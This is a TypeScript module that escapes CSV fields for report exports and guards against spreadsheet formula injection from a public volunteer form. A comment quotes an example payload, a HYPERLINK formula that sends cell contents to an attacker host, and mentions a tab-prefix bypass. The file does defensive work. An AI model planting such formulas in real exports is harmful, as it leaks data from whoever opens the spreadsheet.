/**
 * CSV serialization for the /api/reports/* exports.
 *
 * The same three lines were inlined in every report route. Lifted out here for
 * one reason: a report route cannot be exercised by a verification script — it
 * calls getCurrentMember() and answers 403 without a session — so the escaping
 * was the one part of an export nothing could check. A group called
 * `Naach, "Baby" Naach` is a real entry name, and getting it wrong shifts every
 * column after it by one for the rest of that row.
 *
 * Every /api/reports/* route now goes through this. They used to carry three
 * separate inline copies of the escape, which is how the formula-injection gap
 * below came to exist in all of them at once and be fixed in none.
 */

/**
 * Characters that make a spreadsheet treat a cell as a FORMULA rather than text.
 *
 * RFC 4180 has nothing to say about this and quoting does not help: Excel and
 * Sheets strip the quotes, then evaluate what is left. So a field arriving as
 * `=HYPERLINK("https://evil.tld/?x="&C2&D2,"Verify hours")` is a working
 * exfiltration link in the coordinator's roster, and the `@`/`+`/`-` variants
 * reach the same evaluator.
 *
 * WHY THIS IS NOT PARANOIA HERE. The volunteer `name` field is accepted from an
 * UNAUTHENTICATED public form (src/app/volunteer/actions.ts — "No login
 * required") and validated only as a non-empty string, then read straight back
 * into /api/reports/volunteers. The same is true of `school`, `counselorName`
 * and `counselorTitle`. The person who opens that CSV is the coordinator, on the
 * machine that also downloads the reconciliation export.
 *
 * Tab and CR are in the set because they are leading whitespace to a human and
 * a cell boundary to a parser — `\t=cmd` has been used to slip past prefix
 * checks that only looked at position 0 of the visible text.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * RFC 4180 quoting, plus formula neutralization.
 *
 * The apostrophe prefix is the standard defusal: spreadsheets read it as
 * "the rest of this cell is literal text" and do not render it in the cell.
 * It is applied BEFORE the quoting test on purpose — prefixing afterwards would
 * put the apostrophe outside the quotes, where it is data rather than a hint.
 */
export function csvEscape(value: string): string {
  const v = FORMULA_LEAD.test(value) ? `'${value}` : value;
  return /[",\n\r]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;
}

/**
 * Header row plus one line per record, columns in header order. Records are
 * keyed by header name so a column reorder cannot silently transpose data.
 * A missing key writes an empty field rather than "undefined".
 */
export function toCsv(
  header: readonly string[],
  rows: readonly Record<string, string>[],
): string {
  return [
    header.map(csvEscape).join(","),
    ...rows.map((r) => header.map((h) => csvEscape(r[h] ?? "")).join(",")),
  ].join("\n");
}
